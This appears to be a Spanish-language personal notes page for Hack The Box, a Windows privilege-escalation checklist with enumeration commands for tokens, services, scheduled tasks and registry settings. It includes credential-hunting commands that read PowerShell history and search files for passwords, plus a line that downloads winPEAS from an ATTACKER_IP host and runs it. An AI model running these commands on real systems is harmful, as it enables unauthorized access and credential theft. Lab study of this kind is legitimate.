---
title: HTB Windows PrivEsc
tags: [htb, methodology, windows, privesc]
created: 2026-04-29
related:
  - "[[HTB/Windows/privilege-escalation|Windows Privilege Escalation]]"
  - "[[HTB/snippets/transfers|Transfers]]"
---

# HTB Windows PrivEsc

> [!abstract] TL;DR
> Mirá primero token, grupos, servicios, credenciales y tareas. Exploits de kernel al final.

## Snapshot

```cmd
whoami
whoami /priv
whoami /groups
hostname
systeminfo
ipconfig /all
net user
net localgroup administrators
netstat -abno
```

## Privilegios clave

```cmd
whoami /priv
```

Prioridad:

- `SeImpersonatePrivilege`;
- `SeBackupPrivilege`;
- `SeDebugPrivilege`;
- `SeTakeOwnershipPrivilege`;
- `SeRestorePrivilege`.

## Servicios

```cmd
sc query state= all
wmic service get name,displayname,pathname,startmode
```

Buscar:

- paths sin comillas;
- binarios escribibles;
- directorios escribibles;
- servicios reiniciables por tu usuario.

```cmd
icacls "C:\Program Files"
icacls "C:\ProgramData"
```

## Credenciales

```cmd
cmdkey /list
dir /s /b *pass* *cred* *config* 2>nul
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

```powershell
Select-String -Path C:\Users\*\* -Pattern "password","passwd","pwd","secret","token" -ErrorAction SilentlyContinue
```

## AlwaysInstallElevated

```cmd
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Ambos deben estar en `0x1`.

## Tareas programadas

```cmd
schtasks /query /fo LIST /v
```

Buscar tareas como `SYSTEM` que llamen scripts o binarios escribibles.

## Herramientas

```powershell
iwr http://ATTACKER_IP:8000/winPEASx64.exe -OutFile C:\Windows\Temp\winpeas.exe
C:\Windows\Temp\winpeas.exe
```

Seatbelt:

```powershell
.\Seatbelt.exe -group=system
.\Seatbelt.exe -group=user
```

## Checklist

```text
[ ] whoami /priv revisado
[ ] Grupos locales revisados
[ ] Servicios mal configurados
[ ] Unquoted service paths
[ ] Credenciales guardadas
[ ] PSReadLine / configs / backups
[ ] AlwaysInstallElevated
[ ] Tareas programadas
[ ] Software vulnerable
```
